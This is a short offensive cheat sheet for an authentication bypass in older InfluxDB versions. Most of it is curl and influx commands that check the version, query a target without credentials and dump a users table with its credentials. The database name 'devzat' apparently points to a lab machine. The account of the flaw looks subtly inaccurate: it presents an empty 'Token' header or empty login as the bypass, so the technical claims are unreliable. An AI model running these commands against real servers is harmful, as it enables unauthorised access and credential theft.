# InfluxDB Authentication Bypass

InfluxDB <1.7.6 has an authentication bypass when the token value is set to an empty string. Query the database without valid credentials.

```bash
# Check version
curl -s http://<TARGET>:8086/ping -v

# Auth bypass — empty token
curl -s "http://<TARGET>:8086/query" --data-urlencode "q=SHOW DATABASES" -H "Authorization: Token "
# or
influx -host <TARGET> -port 8086 -username '' -password ''

# List databases and dump users/credentials
curl -s "http://<TARGET>:8086/query?db=devzat" --data-urlencode "q=SELECT * FROM users" -H "Authorization: Token "
```
